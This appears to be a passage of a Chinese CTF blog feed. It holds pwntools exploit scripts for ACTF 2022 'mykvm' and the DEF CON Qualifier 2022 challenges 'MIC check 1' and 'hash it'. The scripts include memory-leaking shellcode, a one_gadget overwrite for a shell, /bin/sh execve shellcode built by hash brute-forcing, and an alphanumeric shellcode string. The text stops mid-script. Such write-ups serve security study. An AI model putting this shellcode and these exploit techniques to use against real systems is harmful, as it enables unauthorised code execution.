"\xbf\x16\x04\xba\x17\x02\x8a\x05\xee\x47\x81\xff\x1e\x04\x75\xf6\xf4" # leak where to read</span><span class="token comment">#shellcode = "\xbf\x00\x71\xba\x17\x02\x8a\x05\xee\x47\x81\xff\x08\x71\x75\xf6\xf4" # leak where to write</span>shellcode <span class="token operator">=</span> <span class="token string">"\xbf\x16\x04\xba\x17\x02\x8a\x05\xee\x47\x81\xff\x1e\x04\x75\xf6\xbf\x00\x71\xb0\x0d\x88\x05\xb0\x20\x88\x45\x01\xb0\x60\x88\x45\x02\xb0\x00\x88\x45\x03\xb0\x00\x88\x45\x04\xb0\x00\x88\x45\x05\xf4"</span><span class="token triple-quoted-string string">'''search memory:mov di,0mov dx,0x217.start:mov al,[di]out dx,alinc dicmp di,0xffffjne .starthlt'''</span><span class="token triple-quoted-string string">'''leak libc:mov di,0x416mov dx,0x217.start:mov al,[di]out dx,alinc dicmp di,0x41ejne .starthlt'''</span><span class="token triple-quoted-string string">'''leak mem idx:mov di,0x7100mov dx,0x217.start:mov al,[di]out dx,alinc dicmp di,0x7108jne .starthlt'''</span><span class="token triple-quoted-string string">'''write memory:mov di,0x416mov dx,0x217.start:mov al,[di]out dx,alinc dicmp di,0x41ejne .startmov di,0x7100mov al,0x08mov [di],almov al,0x20mov [di+1],almov al,0x60mov [di+2],almov al,0mov [di+3],almov al,0mov [di+4],almov al,0mov [di+5],alhlt'''</span><span class="token keyword">def</span> <span class="token function">save_mem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    content <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        content <span class="token operator">+=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'dumpmem'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"your code size: \n"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"your code: \n"</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span><span class="token comment"># gdb.attach(io,"b *0x40111d")</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"guest name: "</span><span class="token punctuation">,</span><span class="token string">"unr4v31"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"guest passwd: "</span><span class="token punctuation">,</span><span class="token string">"unr4v31"</span><span class="token punctuation">)</span><span class="token comment"># save_mem()</span><span class="token comment"># raw_input()</span><span class="token keyword">def</span> <span class="token function">findidx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        byte <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> byte <span class="token operator">==</span> <span class="token string">'\x7f'</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span><span class="token comment"># findidx()</span><span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7198</span><span class="token operator">-</span><span class="token number">0x610000</span>info<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x45226</span>info<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"host name: "</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x1d</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>one_gadget<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span>one_gadget<span class="token operator">&amp;</span><span class="token number">0xff0000</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://lwn.net/Articles/658511/">Using the KVM API</a></p><p><a href="https://elixir.bootlin.com/linux/v5.16-rc1/source/include/uapi/linux/kvm.h#L98">kvm.h - include&#x2F;uapi&#x2F;linux&#x2F;kvm.h - Linux source code (v5.16-rc1) - Bootlin</a></p><p><a href="https://www.jianshu.com/p/5ec4507e9be0">„ÄêKVM„ÄëKVMÂ≠¶‰π†-ÂÆûÁé∞Ëá™Â∑±ÁöÑÂÜÖÊ†∏</a></p><p>[<a href="https://david942j.blogspot.com/2018/10/note-learning-kvm-implement-your-own.html">Note] Learning KVM - implement your own kernel</a></p><p><a href="https://c9x.me/x86/html/file_module_x86_id_139.html">x86 Instruction Set Reference</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/28/mykvm/">ACTF 2022 Pwn mykvm</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DEF CON Qualifier 2022</title>
      <link href="/2022/05/31/def-con-qualifier-2022/"/>
      <url>/2022/05/31/def-con-qualifier-2022/</url>
      
        <content type="html"><![CDATA[<p>„ÄåÈ¢òÁõÆÈìæÊé•„ÄçÔºö<a href="https://github.com/Nautilus-Institute/quals-2022">https://github.com/Nautilus-Institute/quals-2022</a></p><h1 id="MIC-check-1"><a href="#MIC-check-1" class="headerlink" title="MIC check 1"></a>MIC check 1</h1><p>Á≠æÂà∞È¢òÔºåËÆ°ÁÆóÁªôÁöÑÊï∞Â≠¶È¢ò</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"simple-service-c45xrrmhuc5su.shellweplayaga.me"</span><span class="token punctuation">,</span><span class="token string">"31337"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Ticket please: "</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"ticket&#123;FreeboardPort8285n22:i1wxz8BFiFl6thcsJPGNkqiNsIZTgKdeySpriUVC4gu0WnY4&#125;"</span><span class="token punctuation">)</span>answer <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"= "</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"*"</span> <span class="token operator">*</span><span class="token number">20</span><span class="token keyword">print</span> answerq <span class="token operator">=</span> answer<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" ="</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token keyword">print</span> aio<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220531092700900.png" alt="image-20220531092700900"></p><h1 id="hash-it"><a href="#hash-it" class="headerlink" title="hash it"></a>hash it</h1><p>ËæìÂÖ•ÁöÑÂÜÖÂÆπÂàÜÂà´Ë¢´md5,sha1,sha256,sha512Â§ÑÁêÜÔºåÊØè‰∏§‰∏™Â≠óËäÇÂ§ÑÁêÜ‰∏ÄÊ¨°ÔºåÂèñÂ§ÑÁêÜÂêéÁöÑÁ¨¨‰∏Ä‰∏™Â≠óËäÇÊãºÊé•Âá∫shellcodeÊâßË°å„ÄÇÊÄùË∑ØÊòØÂìàÂ∏åÁ¢∞ÊíûÂèØËßÅÂ≠óÁ¨¶ÔºåÊãºÊé•Âá∫Êù•Âç≥ÂèØ„ÄÇ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token keyword">import</span> hashlibcontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'sp'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span><span class="token comment"># shellcode = '\\x50\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x54\\x5f\\xb0\\x3b\\x0f\\x05'</span>table <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890~!@#$%^&amp;*()_+-=;:\\'</span>"<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token operator">&lt;></span><span class="token operator">/</span>?`<span class="token operator">|</span>'char_table <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'j'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token string">'v'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'J'</span><span class="token punctuation">,</span> <span class="token string">'K'</span><span class="token punctuation">,</span> <span class="token string">'L'</span><span class="token punctuation">,</span> <span class="token string">'M'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token string">'P'</span><span class="token punctuation">,</span> <span class="token string">'Q'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token string">'V'</span><span class="token punctuation">,</span> <span class="token string">'W'</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">,</span> <span class="token string">'Y'</span><span class="token punctuation">,</span> <span class="token string">'Z'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'~'</span><span class="token punctuation">,</span> <span class="token string">'!'</span><span class="token punctuation">,</span> <span class="token string">'@'</span><span class="token punctuation">,</span> <span class="token string">'#'</span><span class="token punctuation">,</span> <span class="token string">'$'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">'^'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'|'</span><span class="token punctuation">]</span><span class="token comment"># shellcode = ['50','48','31','d2','48','bb','2f','62','69','6e','2f','2f','73','68','53','54','5f','b0','3b','0f','05']</span><span class="token comment"># shellcode = ['50', '50', '5E', '48', '31', 'D2', '48', 'BB', '2F', '62', '69', '6E', '2F', '2F', '73', '68', '53', '54', '5F', 'B0', '3B', '0F', '05']</span>shellcode <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'50'</span><span class="token punctuation">,</span><span class="token string">'48'</span><span class="token punctuation">,</span><span class="token string">'31'</span><span class="token punctuation">,</span><span class="token string">'d2'</span><span class="token punctuation">,</span><span class="token string">'48'</span><span class="token punctuation">,</span><span class="token string">'31'</span><span class="token punctuation">,</span><span class="token string">'f6'</span><span class="token punctuation">,</span><span class="token string">'48'</span><span class="token punctuation">,</span><span class="token string">'bb'</span><span class="token punctuation">,</span><span class="token string">'2f'</span><span class="token punctuation">,</span><span class="token string">'62'</span><span class="token punctuation">,</span><span class="token string">'69'</span><span class="token punctuation">,</span><span class="token string">'6e'</span><span class="token punctuation">,</span><span class="token string">'2f'</span><span class="token punctuation">,</span><span class="token string">'2f'</span><span class="token punctuation">,</span><span class="token string">'73'</span><span class="token punctuation">,</span><span class="token string">'68'</span><span class="token punctuation">,</span><span class="token string">'53'</span><span class="token punctuation">,</span><span class="token string">'54'</span><span class="token punctuation">,</span><span class="token string">'5f'</span><span class="token punctuation">,</span><span class="token string">'b0'</span><span class="token punctuation">,</span><span class="token string">'3b'</span><span class="token punctuation">,</span><span class="token string">'0f'</span><span class="token punctuation">,</span><span class="token string">'05'</span><span class="token punctuation">]</span><span class="token comment"># RXWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjUTYfi9JH0t800T810T850T880T8A0T8B0T8C0T8G0T8H0T8I0T8J0T8N0T8O0T8P0T8Q0T8R0T8SRAPZ0t8E0t8F0t8LZRARZ0t8MZjZTYfi9FD0t810T86RAPZ0t820t840t85ZHpzbinzshUPHAgHGFUUUUHGBUUUUHGHnUUUZP</span><span class="token keyword">def</span> <span class="token function">init_table</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    char_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        char_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> char_list    <span class="token keyword">return</span> char_list<span class="token comment"># init_table()</span><span class="token keyword">def</span> <span class="token function">md5_hash_code</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">:</span>    hash_code_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> char_table<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            b <span class="token operator">=</span> char_table<span class="token punctuation">[</span>j<span class="token punctuation">]</span>            res <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> byte<span class="token punctuation">:</span> <span class="token comment"># push rax</span>                hash_code_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span>    <span class="token keyword">return</span> hash_code_list<span class="token keyword">def</span> <span class="token function">sha1_hash_code</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">:</span>    hash_code_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> char_table<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            b <span class="token operator">=</span> char_table<span class="token punctuation">[</span>j<span class="token punctuation">]</span>            res <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> byte<span class="token punctuation">:</span>                hash_code_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span>    <span class="token keyword">return</span> hash_code_list<span class="token keyword">def</span> <span class="token function">sha256_hash_code</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">:</span>    hash_code_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> char_table<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            b <span class="token operator">=</span> char_table<span class="token punctuation">[</span>j<span class="token punctuation">]</span>            res <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> byte<span class="token punctuation">:</span>                hash_code_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span>    <span class="token keyword">return</span> hash_code_list<span class="token keyword">def</span> <span class="token function">sha512_hash_code</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">:</span>    hash_code_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> char_table<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            b <span class="token operator">=</span> char_table<span class="token punctuation">[</span>j<span class="token punctuation">]</span>            res <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha512<span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> byte<span class="token punctuation">:</span>                hash_code_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span>    <span class="token keyword">return</span> hash_code_list<span class="token keyword">print</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">generation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token string">""</span>    result <span class="token operator">+=</span> md5_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha1_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha256_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha512_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> md5_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha1_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha256_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha512_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> md5_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha1_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token 